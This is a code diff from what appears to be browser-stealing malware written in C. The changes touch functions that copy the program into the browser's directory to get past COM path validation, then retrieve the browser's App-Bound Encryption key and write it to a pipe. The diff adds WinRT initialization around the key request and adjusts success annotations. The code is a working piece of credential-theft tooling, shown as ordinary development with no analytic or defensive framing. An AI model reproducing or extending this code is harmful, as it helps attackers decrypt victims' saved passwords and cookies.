@@ -3,23 +3,30 @@
 /*** method: Drop (copy self into the browser dir so COM path validation passes) ***/
 
 /* Drop child: runs from the browser directory, writes the key to the stdout pipe */
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeDropChild(
     _In_ const NET_BROWSER_INFO* Browser)
 {
     CHAR Line[ABE_KEY_SIZE * 2 + 16];
     HANDLE StdOut;
+    HRESULT RoHr;
     ULONG Length;
 
     RtlZeroMemory((PVOID)g_Key, ABE_KEY_SIZE);
     g_Pending = 0;
     g_Code = (LONG)E_FAIL;
-    if (!AbePrepareRequest(Browser))
+    RoHr = RoInitialize(RO_INIT_SINGLETHREADED);
+    if (FAILED(RoHr))
     {
+        /* reading Local State uses WinRT JSON */
         return FALSE;
     }
-    AbePayloadWorker();
+    if (AbePrepareRequest(Browser))
+    {
+        AbePayloadWorker();
+    }
+    RoUninitialize();
     if (g_Code != 0)
     {
         return FALSE;
@@ -34,7 +41,7 @@ AbeDropChild(
            NT_SUCCESS(IO_WriteFile(StdOut, NULL, Line, (ULONG)Str_SizeA(Line), NULL));
 }
 
-_Success_(return)
+_Success_(return != FALSE)
 BOOL
 AbeGetKeyDrop(
     _In_ const NET_BROWSER_INFO* Browser,
